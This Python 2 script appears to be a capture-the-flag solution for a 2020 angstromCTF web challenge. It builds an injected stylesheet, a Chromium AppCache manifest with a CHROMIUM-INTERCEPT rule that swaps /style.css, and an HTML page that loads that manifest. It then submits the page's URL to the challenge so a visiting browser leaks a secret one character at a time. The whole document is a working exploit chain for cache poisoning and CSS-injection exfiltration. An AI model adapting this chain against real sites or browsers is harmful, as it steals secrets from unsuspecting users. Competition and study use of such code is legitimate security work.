import subprocess
import requests
import re
import json

manifest_fmt = """CHROMIUM CACHE MANIFEST

NETWORK:
*

FALLBACK:

CHROMIUM-INTERCEPT:
/style.css return {}

CACHE:
/"""

html_fmt = """
<html manifest="{}">
<meta http-equiv="refresh" content="3;url=https://flags.2020.chall.actf.co/" />
</html>
"""

curr = "4282bb2f3f3e94cb"
for i in range(len(curr), 16):
    subprocess.check_output(["python", "gen_injection.py", curr])
    build_output = subprocess.check_output(["python", "build.py", "style_sice.css"])
    build_id = re.search('build/(.+)/source.c', json.loads(build_output)['message']).group(1)
    print build_id
    css_url = subprocess.check_output(["python", "download.py", build_id, "text/css"]).strip()
    print css_url
    manifest = manifest_fmt.format(css_url.replace("https://flags.2020.chall.actf.co", ""))
    with open("manifest.txt", "wb") as f:
        f.write(manifest)
    build_output = subprocess.check_output(["python", "build.py", "manifest.txt"])
    build_id = re.search('build/(.+)/source.c', json.loads(build_output)['message']).group(1)
    print build_id
    manifest_url = subprocess.check_output(["python", "download.py", build_id, "text/cache-manifest"]).strip()
    print manifest_url
    html_src = html_fmt.format(manifest_url.replace("https://flags.2020.chall.actf.co", ""))
    with open("attack.html", "wb") as f:
        f.write(html_src)
    build_output = subprocess.check_output(["python", "build.py", "attack.html"])
    build_id = re.search('build/(.+)/source.c', json.loads(build_output)['message']).group(1)
    print build_id
    html_url = subprocess.check_output(["python", "download.py", build_id, "text/html"]).strip()
    print html_url
    requests.post("https://flags.2020.chall.actf.co/submit", data={"url": html_url})

    next_char = raw_input("Next Char: ").strip()
    curr += next_char
